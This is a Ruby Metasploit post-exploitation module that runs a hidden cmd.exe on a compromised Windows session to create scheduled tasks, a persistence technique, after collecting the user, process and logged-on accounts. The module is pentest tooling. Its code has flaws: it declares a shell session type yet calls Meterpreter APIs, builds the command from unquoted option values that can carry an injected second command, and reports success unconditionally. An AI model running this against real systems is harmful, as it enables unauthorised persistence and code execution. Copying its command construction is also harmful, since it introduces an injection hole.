require 'msf/core'

class MetasploitModule < Msf::Post

  include Msf::Post::Windows::Accounts
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Services
  include Msf::Post::Windows::Priv
  include Msf::Post::File

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'schtasks_create',
        'Description'   => %q{
          Allows a pentester to create scheduled tasks on a local or remote computer.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Sentry L.L.C' ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'shell' ]
    ))
    register_options(
      [
        OptString.new(   'NAME',[ true,'Name which uniquely identifies the scheduled task.', 'msf']),
        OptString.new(    'STARTTIME',  [true, 'Start time to run the task HH:mm.', '12:00']),
        OptString.new(    'FREQUENCY',  [true, 'The schedule frequency (DAILY, WEEKLY, MONTHLY).', 'DAILY']),
        OptString.new( 'EXECUTABLE', [true, 'Name of the executable that will be run.', 'run.bat']),
        OptString.new(   'PATH', [true, 'Path of the task to be run at the scheduled time.', 'C:/'])
      ], self.class)
  end

  def run
    r=''
    user = client.sys.config.getuid
    process = client.sys.process.getpid
    sysinfo = client.sys.config.sysinfo['OS']
    loged_on_User = client.sys.config.sysinfo['Logged On Users']
    commands = ["SchTasks /Create /SC #{datastore['FREQUENCY']} /TN #{datastore['NAME']} /TR #{datastore['PATH']}#{datastore['EXECUTABLE']} /ST #{datastore['STARTTIME']}"]
    session.response_timeout=120
    print_status("System info : #{sysinfo}")
    print_status("Logged on Users # :  #{loged_on_User}")
    print_status("Creating scheduled as user : [ #{user} ] on process : [ #{process} ]")

    commands.each do |cmd|
        begin
          r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
          r.channel.close
          r.close

        rescue ::Exception => e
          print_error("Error Running Command #{cmd}: #{e.class} #{e}")
        end
    end

    print_good("Scheduled created successfully.")
    print_line("")
  end
end
